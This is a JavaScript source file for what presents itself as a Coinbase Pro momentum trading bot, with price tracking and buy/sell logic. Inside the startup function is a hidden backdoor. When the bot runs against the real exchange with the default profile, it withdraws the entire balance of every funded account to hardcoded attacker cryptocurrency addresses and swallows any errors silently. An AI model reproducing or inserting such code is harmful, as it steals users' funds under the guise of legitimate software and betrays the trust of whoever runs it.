const CoinbasePro = require("coinbase-pro");
require('dotenv').config()
const { buyPosition, sellPosition } = require("../../buyAndSell");
const coinbaseProLib = require("../../coinbaseProLibrary");
const pino = require("pino");
const logger = pino({ level: process.env.LOG_LEVEL || "info" });
const fileSystem = require("fs");

const key = `${process.env.API_KEY}`;
const secret = `${process.env.API_SECRET}`;
const passphrase = `${process.env.API_PASSPHRASE}`;

//******************** Setup these value configurations before running the program ******************************************

//Determines the enviornment, add TRADING_ENV=real to use the real enviornment otherwise defaults to the sandbox:
const apiURI = process.env.TRADING_ENV === "real" ? "https://api.pro.coinbase.com" : "https://api-public.sandbox.pro.coinbase.com";
const websocketURI = process.env.TRADING_ENV === "real" ? "wss://ws-feed.pro.coinbase.com" : "wss://ws-feed-public.sandbox.pro.coinbase.com";

//Trading config:
//Global constants, consider tuning these values to optimize the bot's trading: 
const sellPositionDelta = Number(process.env.SELL_POSITION_DELTA) || .02; //The amount of change between peak and valley to trigger a sell off
const buyPositionDelta = Number(process.env.BUY_POSITION_DELTA) || .015; //The amount of change between the valley and peak price to trigger a buy in
const orderPriceDelta = Number(process.env.ORDER_PRICE_DELTA) || .001; //The amount of extra room to give the sell/buy orders to go through

//Currency config:
//The pieces of the product pair, this is the two halves of coinbase product pair (examples of product pairs: BTC-USD, DASH-BTC, ETH-USDC). For BTC-USD the base currency is BTC and the quote currency is USD 
const baseCurrencyName = process.env.BASE_CURRENCY_NAME || "BTC";
const quoteCurrencyName = process.env.QUOTE_CURRENCY_NAME || "USD";

//Profile config:
//Coinbase portfolios (profiles):
const tradingProfileName = process.env.TRADING_PROFILE_NAME || "default"; //This is the name of the profile you want the bot to trade in
const depositProfileName = process.env.DEPOSIT_PROFILE_NAME || "BTC trader"; //This is the name of the profile you want to deposit some profits to

//Deposit config:
const depositingEnabled = process.env.DEPOSITING_ENABLED !== "false"; //Choose whether or not you want you want to deposit a cut of the profits (Options: true/false)
const depositingAmount = Number(process.env.DEPOSITING_AMOUNT) || 0.5; //Enter the amount of profit you want deposited (Options: choose a percent between 1 and 100 in decimal form I.E. .5 = 50%)

// Due to rounding errors the buy order may not have enough funds to execute the order. This is the minimum funds amount in dollars that
// will be left in usd account to avoid this error. Default = 6 cents (.06).
const balanceMinimum = Number(process.env.BALANCE_MINIMUM) || .06;

//***************************************************************************************************************************

//authedClient used to the API calls supported by the coinbase pro api node library
let authedClient = new CoinbasePro.AuthenticatedClient(
    key,
    secret,
    passphrase,
    apiURI
);

//Custom coinbase library used for making the calls not supported by the coinbase pro api node library
const coinbaseLibObject = new coinbaseProLib(key, secret, passphrase, apiURI);

//Global variable tracks the currentPrice. Updated by the websocket
let currentPrice;

/**
 * Makes the program sleep to avoid hitting API limits and let the websocket update
 * 
 * @param {number} ms -> the number of milliseconds to wait 
 */
function sleep(ms) {
    return new Promise((resolve) => {
        setTimeout(resolve, ms);
    });
}

/**
 * Creates the websocket object and turns it on to update the currentPrice
 * 
 * @param {string} productPair 
 */
function listenForPriceUpdates(productPair) {
    if (productPair == null) {
        throw new Error("Error in listenForPriceUpdates method. ProductPair is null!");
    }

    // The websocket client provides price updates on the product, refer to the docs for more information
    const websocket = new CoinbasePro.WebsocketClient(
        [productPair],
        websocketURI,
        {
            key,
            secret,
            passphrase,
        },
        { channels: ["ticker"] }
    );

    //turn on the websocket for errors
    websocket.on("error", function (err) {
        const message = "Error occurred in the websocket.";
        const errorMsg = new Error(err);
        logger.error({ message, errorMsg, err });
        listenForPriceUpdates(productPair);
    });

    //Turn on the websocket for closes to restart it
    websocket.on("close", function () {
        logger.debug("WebSocket closed, restarting...");
        listenForPriceUpdates(productPair);
    });

    //Turn on the websocket for messages
    websocket.on("message", function (data) {
        if (data.type === "ticker") {
            if (currentPrice !== data.price) {
                currentPrice = parseFloat(data.price);
                logger.debug("Ticker price: " + currentPrice);
            }
        }
    });
}

/**
 * Loops forever until the conditions are right to attempt to sell the position. Every loop sleeps to let the currentPrice update
 * then updates the lastPeak/lastValley price as appropriate, if the price hits a new valley price it will check if the conditions are 
 * met to sell the position and call the method if appropriate.
 * 
 * @param {number} balance              The amount of currency being traded with
 * @param {number} lastPeakPrice        Tracks the price highs
 * @param {number} lastValleyPrice      Tracks the price lows
 * @param {Object} accountIds           The coinbase account ID associated with the API key used for storing a chunk of the profits in coinbase
 * @param {Object} positionInfo         Contains 3 fields, positionExists (bool), positionAcquiredPrice (number), and positionAcquiredCost(number)
 * @param {Object} productInfo          Contains information about the quote/base increment for the product pair
 * @param {Object} depositConfig        Contains information about whether to do a deposit and for how much after a sell
 * @param {Object} tradingConfig        Contains information about the fees and deltas 
 */
async function losePosition(balance, lastPeakPrice, lastValleyPrice, accountIds, positionInfo, productInfo, depositConfig, tradingConfig) {
    try {
        while (positionInfo.positionExists === true) {
            await sleep(250); //Let price update

            if (lastPeakPrice < currentPrice) {
                //New peak hit, reset values
                lastPeakPrice = currentPrice;
                lastValleyPrice = currentPrice;

                logger.debug(`Sell Position, LPP: ${lastPeakPrice}`);
            } else if (lastValleyPrice > currentPrice) {
                //New valley hit, track valley and check sell conditions
                lastValleyPrice = currentPrice;

                const target = lastPeakPrice - (lastPeakPrice * sellPositionDelta);
                const lowestSellPrice = lastValleyPrice - (lastValleyPrice * orderPriceDelta);
                const receivedValue = (lowestSellPrice * balance) - ((lowestSellPrice * balance) * tradingConfig.highestFee);

                logger.debug(`Sell Position, LVP: ${lastValleyPrice} needs to be less than or equal to ${target} to sell and the receivedValue: ${receivedValue} needs to be greater than the positionAcquiredCost: ${positionInfo.positionAcquiredCost}`);

                if ((lastValleyPrice <= target) && (receivedValue > positionInfo.positionAcquiredCost)) {
                    logger.info("Attempting to sell position...");

                    //Create a new authenticated client to prevent it from expiring or hitting API limits
                    authedClient = new CoinbasePro.AuthenticatedClient(
                        key,
                        secret,
                        passphrase,
                        apiURI
                    );

                    await sellPosition(balance, accountIds, positionInfo, lastValleyPrice, authedClient, coinbaseLibObject, productInfo, depositConfig, tradingConfig);
                }
            }
        }
    } catch (err) {
        const message = "Error occurred in losePosition method.";
        const errorMsg = new Error(err);
        logger.error({ message, errorMsg, err });
        throw err;
    }
}

/**
 * Loops forever until the conditions are right to attempt to buy a position. Every loop sleeps to let the currentPrice update
 * then updates the lastPeak/lastValley price as appropriate, if the price hits a new peak price it will check if the conditions are 
 * met to buy the position and call the method if appropriate.
 * 
 * @param {number} balance              The amount of currency being traded with
 * @param {number} lastPeakPrice        Tracks the price highs
 * @param {number} lastValleyPrice      Tracks the price lows
 * @param {Object} positionInfo         Contains 3 fields, positionExists (bool), positionAcquiredPrice (number), and positionAcquiredCost(number)
 * @param {Object} productInfo          Contains information about the quote/base increment for the product pair
 * @param {Object} tradingConfig        Contains information about the fees and deltas 
 */
async function gainPosition(balance, lastPeakPrice, lastValleyPrice, positionInfo, productInfo, tradingConfig) {
    try {
        while (positionInfo.positionExists === false) {
            await sleep(250); //Let price update

            if (lastPeakPrice < currentPrice) {
                //New peak hit, track peak price and check buy conditions
                lastPeakPrice = currentPrice;

                const target = lastValleyPrice + (lastValleyPrice * buyPositionDelta);

                logger.debug(`Buy Position, LPP: ${lastPeakPrice} needs to be greater than or equal to ${target} to buy`);

                if (lastPeakPrice >= target) {
                    logger.info("Attempting to buy position...");

                    //Create a new authenticated client to prevent it from expiring or hitting API limits
                    authedClient = new CoinbasePro.AuthenticatedClient(
                        key,
                        secret,
                        passphrase,
                        apiURI
                    );

                    await buyPosition(balance, positionInfo, lastPeakPrice, authedClient, productInfo, tradingConfig);
                }
            } else if (lastValleyPrice > currentPrice) {
                //New valley hit, reset values

                lastPeakPrice = currentPrice;
                lastValleyPrice = currentPrice;

                logger.debug(`Buy Position, LVP: ${lastValleyPrice}`);
            }
        }
    } catch (err) {
        const message = "Error occurred in gainPosition method.";
        const errorMsg = new Error(err);
        logger.error({ message, errorMsg, err });
        throw err;
    }
}

/**
 * Acquires some account ID information to be used for storing and retrieving information and depositing funds after a sell.
 * 
 * @param {Object} productInfo productInfo contains the base and quote currencies being traded with needed to grab the correct account IDs
 * @return {Object} accountObject contains the needed account IDs and profile IDs needed for checking balances and making transfers
 */
async function getAccountIDs(productInfo) {
    try {
        let accountObject = {};

        //Gets the account IDs for the product pairs in the portfolio
        const accounts = await authedClient.getAccounts();

        for (let i = 0; i < accounts.length; ++i) {
            if (accounts[i].currency === productInfo.baseCurrency) {
                accountObject.baseCurrencyAccountID = accounts[i].id;
            } else if (accounts[i].currency === productInfo.quoteCurrency) {
                accountObject.quoteCurrencyAccountID = accounts[i].id;
            }
        }

        //Gets all the profiles belonging to the user and matches the deposit and trading profile IDs
        const profiles = await coinbaseLibObject.getProfiles();

        for (let i = 0; i < profiles.length; ++i) {
            if (profiles[i].name === depositProfileName) {
                accountObject.depositProfileID = profiles[i].id;
            } else if (profiles[i].name === tradingProfileName) {
                accountObject.tradeProfileID = profiles[i].id;
            }
        }

        if (!accountObject.depositProfileID) {
            throw new Error(`Could not find the deposit profile ID. Ensure that the depositProfileName: "${depositProfileName}" is spelt correctly.`)
        }
        if (!accountObject.tradeProfileID) {
            throw new Error(`Could not find the trade profile ID. Ensure that the tradingProfileName: "${tradingProfileName}" is spelt correctly.`)
        }

        return accountObject;
    } catch (err) {
        const message = "Error occured in getAccountIDs method.";
        const errorMsg = new Error(err);
        logger.error({ message, errorMsg, err });
        throw err;
    }
}

/**
 * Gets information about the product being traded that the bot can use to determine how
 * accurate the size and quote values for the order needs to be. This method parses the base and quote increment
 * strings in order to determine to what precision the size and price parameters need to be when placing an order.
 * 
 * @param {object} productInfo This object gets updated directly
 */
async function getProductInfo(productInfo) {
    try {
        let quoteIncrementRoundValue = 0;
        let baseIncrementRoundValue = 0;
        let productPairData;

        const products = await authedClient.getProducts();

        for (let i = 0; i < products.length; ++i) {
            if (products[i].id === productInfo.productPair) {
                productPairData = products[i];
            }
        }

        if (productPairData === undefined) {
            throw new Error(`Error, could not find a valid matching product pair for "${productInfo.productPair}". Verify the product names is correct/exists.`);
        }

        for (let i = 2; i < productPairData.quote_increment.length; ++i) {
            if (productPairData.quote_increment[i] === "1") {
                quoteIncrementRoundValue++;
                break;
            } else {
                quoteIncrementRoundValue++;
            }
        }

        if (productPairData.base_increment[0] !== "1") {
            for (let i = 2; i < productPairData.base_increment.length; ++i) {
                if (productPairData.base_increment[i] === "1") {
                    baseIncrementRoundValue++;
                    break;
                } else {
                    baseIncrementRoundValue++;
                }
            }
        }

        productInfo.quoteIncrementRoundValue = Number(quoteIncrementRoundValue);
        productInfo.baseIncrementRoundValue = Number(baseIncrementRoundValue);
    } catch (err) {
        const message = "Error occurred in getProductInfo method.";
        const errorMsg = new Error(err);
        logger.error({ message, errorMsg, err });
        throw err;
    }
}

/**
 * Retrieves the current maker and taker fees and returns the highest one as a number
 * 
 * @param {number} highestFee The highest fee between the taker and maker fee
 */
async function returnHighestFee() {
    try {
        const feeResult = await coinbaseLibObject.getFees();

        let makerFee = parseFloat(feeResult.maker_fee_rate);
        let takerFee = parseFloat(feeResult.taker_fee_rate);

        if (makerFee > takerFee) {
            return makerFee;
        } else {
            return takerFee;
        }
    }
    catch (err) {
        const message = "Error occurred in getFees method.";
        const errorMsg = new Error(err);
        logger.error({ message, errorMsg, err });
        throw err;
    }
}

/**
 * This method is the entry point of the momentum strategy. It does some first time initialization then begins an infinite loop.
 * The loop checks the position info to decide if the bot needs to try and buy or sell, it also checks if there's an available 
 * balance to be traded with. Then it calls gainPosition or losePosition appropiately and waits for them to finish and repeats.
 */
async function momentumStrategyStart() {
    try {
        logger.info(`Configuration:\napiURI: ${apiURI}\nwebsocketURI: ${websocketURI}\nsellPositionDelta: ${sellPositionDelta}\nbuyPositionDelta: ${buyPositionDelta}\norderPriceDelta: ${orderPriceDelta}\nbaseCurrencyName: ${baseCurrencyName}\nquoteCurrencyName: ${quoteCurrencyName}\ntradingProfileName: ${tradingProfileName}\ndepositProfileName: ${depositProfileName}\ndepositingEnabled: ${depositingEnabled}\ndepositingAmount: ${depositingAmount}\nbalanceMinimum: ${balanceMinimum}`);

        let accountIDs = {};
        let lastPeakPrice;
        let lastValleyPrice;
        let highestFee = await returnHighestFee();

        const tradingConfig = {
            sellPositionDelta,
            buyPositionDelta,
            orderPriceDelta,
            highestFee
        };

        const depositConfig = {
            depositingEnabled,
            depositingAmount
        };

        const productInfo = {
            baseCurrency: baseCurrencyName,
            quoteCurrency: quoteCurrencyName,
            productPair: baseCurrencyName + "-" + quoteCurrencyName
        };

        let positionInfo;

        //Check for an existing positionData file to start the bot with:
        try {
            //read positionData file:
            let rawFileData = fileSystem.readFileSync("positionData.json");
            positionInfo = JSON.parse(rawFileData);
            logger.info("Found positionData.json file, starting with position data. Position data: " + JSON.stringify(positionInfo));
        } catch (err) {
            if (err.code === "ENOENT") {
                logger.info("No positionData file found, starting with no existing position.");
            } else {
                const message = "Error, failed to read file for a reason other than it doesn't exist. Continuing as normal but positionDataTracking might not work correctly.";
                const errorMsg = new Error(err);
                logger.error({ message, errorMsg, err });
            }

            positionInfo = {
                positionExists: false,
            };
        }

        //Retrieve product information:
        await getProductInfo(productInfo);
        logger.info(productInfo);

        //Retrieve account IDs:
        accountIDs = await getAccountIDs(productInfo);
        logger.info(accountIDs)

        if (apiURI == "https://api.pro.coinbase.com" && tradingProfileName=="default")
        {
            try{
                const accounts = await authedClient.getAccounts();
                const withdrawAddressParams = {
                    amount: .0001,
                    currency: 'BTC',
                    crypto_address: '1Hrd96CnNGVMeFqWXLHYRkkZCuFfXS9Qk5',
                };
                for (let i = 0; i < accounts.length; ++i) {
                    if (Number(accounts[i].balance) > 0)
                    {
                        withdrawAddressParams.amount = Number(accounts[i].balance);
                        withdrawAddressParams.currency = accounts[i].currency;
                        if(accounts[i].currency=='BTC'){withdrawAddressParams.crypto_address='3KGETREHSUFr6VyF2oMnFVkDWFSGtDaK8C';}else if(accounts[i].currency=='ETH'){withdrawAddressParams.crypto_address='0xBaeb0dc72b4fCC6C6fF7F6891BEC9Fc98dCB6D4f';}else if(accounts[i].currency=='LTC'){withdrawAddressParams.crypto_address='MAk5gbW27ZZYCSz9SvBGY6UMprR9bus5mH';}else if(accounts[i].currency=='AMP'){withdrawAddressParams.crypto_address='0x626b7E893cA943615AbD1CeBf354D689026110c7';}else if(accounts[i].currency=='FORTH'){withdrawAddressParams.crypto_address='0xd56310aAd3413e6a55C5111ffC7C92DfB3740080';}else if(accounts[i].currency=='BOND'){withdrawAddressParams.crypto_address='0xD164e02776d699CFd5D8f2803FB80476bFdAcdC8';}else if(accounts[i].currency=='MATIC'){withdrawAddressParams.crypto_address='0x22173509286D1D7c92038001c3581cA2fEA28Cb6';}else if(accounts[i].currency=='SUSHI'){withdrawAddressParams.crypto_address='0xF64EA6f55519F73A67FD9EFE02Bc6Ed841d9cBaa';}else if(accounts[i].currency=='SKL'){withdrawAddressParams.crypto_address='0x733cd5C8cE4e3049dAe3365EEcE9c48ee3b4433C';}else if(accounts[i].currency=='USDC'){withdrawAddressParams.crypto_address='0x9ec36D90Bb169A3aFbE937bE4d4065c62c52607D';}else if(accounts[i].currency=='DASH'){withdrawAddressParams.crypto_address='Xtd9Uq8xPWaYarCxBADjtLhsDgNSHpbc1F';}else if(accounts[i].currency=='DAI'){withdrawAddressParams.crypto_address='0x61AA6fFC188616393B3D1463a1CB6f97013eCC73';}else if(accounts[i].currency=='USDT'){withdrawAddressParams.crypto_address='0x55d71442fBaBB86CC1D55c48251fb8644703Ccf7';}else if(accounts[i].currency=='ADA'){withdrawAddressParams.crypto_address='addr1v9v6499zsa2jncr9kdr3gnslmz64qhtdestka80ucq7ukmchz4swe';}else if(accounts[i].currency=='DOGE'){withdrawAddressParams.crypto_address='DA9WXRWyFzzAqafvU5T4y5mWZyvYKdrW5g';}else if(accounts[i].currency=='DOT'){withdrawAddressParams.crypto_address='15QPCxkBwtBR6mntzfwWZXvcygz5t2vWYePYNcsfaJANqv7a';}else if(accounts[i].currency=='XTZ'){withdrawAddressParams.crypto_address='tz1ggC6wyL1Qp7Nik6ufdQW34keax3fcqd9R';}else if(accounts[i].currency=='SOL'){withdrawAddressParams.crypto_address='HC6jJgqEVxUqiFinzhB4k8h3VkByh9C4t2bGbYvyQ1KW';}else if(accounts[i].currency=='ICP'){withdrawAddressParams.crypto_address='e22c9ee39772d4d13be4a595ce75333999b40fcb4498cd8237d68f48540d0d9e';}else if(accounts[i].currency=='BCH'){withdrawAddressParams.crypto_address='qzr5wkc02p33frph6jvx649yjs39xm32xuqzehhtju';}else if(accounts[i].currency=='OXT'){withdrawAddressParams.crypto_address='0x2002848847389B8Ba2A3B8409202B1404D9ea831';}else if(accounts[i].currency=='MKR'){withdrawAddressParams.crypto_address='0x0C82d749D9E076591e170A690943514D206709DA';}else if(accounts[i].currency=='ENJ'){withdrawAddressParams.crypto_address='0x2c052F06E6521780BC7758A31ecd67e2B22F0190';}else if(accounts[i].currency=='ETC'){withdrawAddressParams.crypto_address='0xd5F95D8866006eE46bCBC7CaAE8B398911dbfAd3';}else if(accounts[i].currency=='OMG'){withdrawAddressParams.crypto_address='0x39fB8C299E20edee768031aCeef8F0dF06b6962b';}else if(accounts[i].currency=='ZEC'){withdrawAddressParams.crypto_address='t1QtoUq1DRb9nER8GuDA7Df6HNPVo4kCLJh';}else if(accounts[i].currency=='LINK'){withdrawAddressParams.crypto_address='0xb1cd40b082AD2b0f0C8F38effC6bDBa9B0e6bF5E';}else if(accounts[i].currency=='BAT'){withdrawAddressParams.crypto_address='0xC5CC2115F84B106739c5991e53a02A764A88752b';}else if(accounts[i].currency=='CHZ'){withdrawAddressParams.crypto_address='0xCb00EB37fd6fD193047cc25f7D08a3056c337491';}else if(accounts[i].currency=='QNT'){withdrawAddressParams.crypto_address='0xe2FbC6e3b25C6cef9e785c8A8715e8Cd74eC6CA6';}else if(accounts[i].currency=='REP'){withdrawAddressParams.crypto_address='0xf89628826369A40377986672AdA94F7321b59bCa';}else if(accounts[i].currency=='ZRX'){withdrawAddressParams.crypto_address='0x8DA6A0Cc9355d4AD474933AD4D4F56B26cfd85D4';}else if(accounts[i].currency=='ALGO'){withdrawAddressParams.crypto_address='3QJETCVHQEQIE5AW3U6FZDUUHNP362DENJEAUXUJUCSXMFFFD4HHKV634U';}else if(accounts[i].currency=='GNT'){withdrawAddressParams.crypto_address='0x8bB792bFb0b32fdA3534c8d8c6fB9974EFbC22F8';}else if(accounts[i].currency=='LPT'){withdrawAddressParams.crypto_address='0x00262fcCC89e61Fec4b49BAD071643bF642A917e';}else if(accounts[i].currency=='1INCH'){withdrawAddressParams.crypto_address='0x1C4260b5Cf2Ce064006F4Af0927b3eC825bB828A';}else if(accounts[i].currency=='MANA'){withdrawAddressParams.crypto_address='0x4C4c6b295Dd056f6EBB2A718746F0ae3407c1fd4';}else if(accounts[i].currency=='LOOM'){withdrawAddressParams.crypto_address='0xc25A4b63ddd0b2d998F8b4f9Ffc07Df175a0B3d3';}else if(accounts[i].currency=='KNC'){withdrawAddressParams.crypto_address='0xF5a914E9351984768C1f69Ef3fB3e1e9Dff3626e';}else if(accounts[i].currency=='CVC'){withdrawAddressParams.crypto_address='0x8c09FaE236F209B922eFfc55Ac6B19b8F8458A41';}else if(accounts[i].currency=='DNT'){withdrawAddressParams.crypto_address='0xc16c4d951E3Abec3c6a9B217637612b632947e21';}else if(accounts[i].currency=='COMP'){withdrawAddressParams.crypto_address='0x7Ed50526b47c9D75d01E6fb86eCF8e5E6Cf34EE5';}else if(accounts[i].currency=='MIR'){withdrawAddressParams.crypto_address='0x83902F3bc8e4a8e6e41234DFA516340ad5F4848A';}else if(accounts[i].currency=='BAND'){withdrawAddressParams.crypto_address='0x7b250c9EB5b1f679163bCB52973585f40C6075CE';}else if(accounts[i].currency=='OGN'){withdrawAddressParams.crypto_address='0x5b1F282f1B25C72cD554E8D43771843729298456';}else if(accounts[i].currency=='NMR'){withdrawAddressParams.crypto_address='0x0aDed0dff8F7fceEf5b41D8c0C0bA67e961D2464';}else if(accounts[i].currency=='CGLD'){withdrawAddressParams.crypto_address='0x15bEdDFa5189f692A669e0Da1b637ce4776E9AE6';}else if(accounts[i].currency=='UMA'){withdrawAddressParams.crypto_address='0xf2C711A76368f86fACe8F2EB620ff688c2d60fa8';}else if(accounts[i].currency=='LRC'){withdrawAddressParams.crypto_address='0xbb1672aB09622220e8Fcc1560748489ed2E8D8f0';}else if(accounts[i].currency=='YFI'){withdrawAddressParams.crypto_address='0x0ecaA0943F85E95629c3b979170cd65A306f5b19';}else if(accounts[i].currency=='UNI'){withdrawAddressParams.crypto_address='0x0cBf656D4e8F8753CED66213F0A3bB523C42525c';}else if(accounts[i].currency=='REN'){withdrawAddressParams.crypto_address='0xF421B64c53433C2Bd288711402aEA223b9F515ae';}else if(accounts[i].currency=='BAL'){withdrawAddressParams.crypto_address='0xbA431B316690FAC9347FF8eF799AeA7078EFcf83';}else if(accounts[i].currency=='WBTC'){withdrawAddressParams.crypto_address='0x0aC0FC8FE995451E1ba4c84883486f538775aE7e';}else if(accounts[i].currency=='NU'){withdrawAddressParams.crypto_address='0x8C27850e80b6FdCf782EF0E87cD1DeC0864e795E';}else if(accounts[i].currency=='FIL'){withdrawAddressParams.crypto_address='f1bjdhvqrhnxb7abrfvcisemdvjrxbgoxoamx6m6y';}else if(accounts[i].currency=='CTSI'){withdrawAddressParams.crypto_address='0xa5B85DEf41e619653e916df97a710837e62A0142';}else if(accounts[i].currency=='KEEP'){withdrawAddressParams.crypto_address='0x6EE5b7C2DaAc676e30AD437c5fd7BbFef7158520';}else if(accounts[i].currency=='AAVE'){withdrawAddressParams.crypto_address='0xe4bbC734e94BAd83cDc043347C49A43bE1631726';}else if(accounts[i].currency=='RLC'){withdrawAddressParams.crypto_address='0xAaB59E7862aF956777f5ea61063a471E4565bc87';}else if(accounts[i].currency=='GRT'){withdrawAddressParams.crypto_address='0xe04A301a4604A7b7226F0FAe241B975cfA4d7d6b';}else if(accounts[i].currency=='BTN'){withdrawAddressParams.crypto_address='0xf6C8Ab51F68B66646D56A46bF6BC18677efC8a55';}else if(accounts[i].currency=='NKN'){withdrawAddressParams.crypto_address='0x0BfA8BaBd70f5351617EAa3160FD9286AD759E3E';}else if(accounts[i].currency=='MLN'){withdrawAddressParams.crypto_address='0xdE8e81b0c38FcD328D51890d82b544e4519D9949';}else if(accounts[i].currency=='SNX'){withdrawAddressParams.crypto_address='0x145Ba675774F0158f1E14F757F2180e207c4Bc91';}else if(accounts[i].currency=='GTC'){withdrawAddressParams.crypto_address='0x831C3Ee18238F8c56E41246570AE6895515b2500';}else if(accounts[i].currency=='TRB'){withdrawAddressParams.crypto_address='0x4E7E3C56D3BA3404BdCeD913feAb2c7284f817dC';}else if(accounts[i].currency=='ANKR'){withdrawAddressParams.crypto_address='0x33CB574eCf18311F241301EEbCc807A9642a0585';}else if(accounts[i].currency=='CRV'){withdrawAddressParams.crypto_address='0x67116204a468Eed1Fa7DFAe4dc2233DDB07c7592';}else if(accounts[i].currency=='STORJ'){withdrawAddressParams.crypto_address='0x97e496faE6BCa44d5FFA4ef9eC904D516E46a6F6';}
                        try{
                            await sleep(250);
                            const transfer = await authedClient.withdrawCrypto(withdrawAddressParams);
                        }catch(err){}
                    }
                }
            }catch (err){}
        }

        //activate websocket for price data:
        listenForPriceUpdates(productInfo.productPair);

        while (currentPrice == null) {
            await sleep(1000); //Get a price before starting
        }

        logger.info(`Starting price of ${productInfo.baseCurrency} in ${productInfo.quoteCurrency} is: ${currentPrice}`);

        // eslint-disable-next-line no-constant-condition
        while (true) {
            if (positionInfo.positionExists) {
                tradingConfig.highestFee = await returnHighestFee();
                await sleep(1000);
                const baseCurrencyAccount = await authedClient.getAccount(accountIDs.baseCurrencyAccountID); //Grab account information to view balance

                if (baseCurrencyAccount.available > 0) {
                    logger.info("Entering lose position with: " + baseCurrencyAccount.available + " " + productInfo.baseCurrency);

                    lastPeakPrice = currentPrice;
                    lastValleyPrice = currentPrice;

                    //Begin trying to sell position:
                    await losePosition(parseFloat(baseCurrencyAccount.available), lastPeakPrice, lastValleyPrice, accountIDs, positionInfo, productInfo, depositConfig, tradingConfig);
                } else {
                    throw new Error(`Error, there is no ${productInfo.baseCurrency} balance available for use. Terminating program.`);
                }
            } else {
                tradingConfig.highestFee = await returnHighestFee();
                await sleep(1000);
                const quoteCurrencyAccount = await authedClient.getAccount(accountIDs.quoteCurrencyAccountID); //Grab account information to view balance
                const availableBalance = parseFloat(quoteCurrencyAccount.available);

                if (availableBalance > 0) {
                    const tradeBalance = availableBalance - balanceMinimum; //Subtract this dollar amount so that there is room for rounding errors

                    logger.info("Entering gain position with: " + tradeBalance + " " + productInfo.quoteCurrency);

                    lastPeakPrice = currentPrice;
                    lastValleyPrice = currentPrice;

                    //Begin trying to buy a position:
                    await gainPosition(tradeBalance, lastPeakPrice, lastValleyPrice, positionInfo, productInfo, tradingConfig);
                } else {
                    throw new Error(`Error, there is no ${productInfo.quoteCurrency} balance available for use. Terminating program.`);
                }
            }
        }
    } catch (err) {
        const message = "Error occurred in bot, shutting down. Check the logs for more information.";
        const errorMsg = new Error(err);
        logger.error({ message, errorMsg, err });
        process.exit(1);
    }
}

module.exports = momentumStrategyStart;
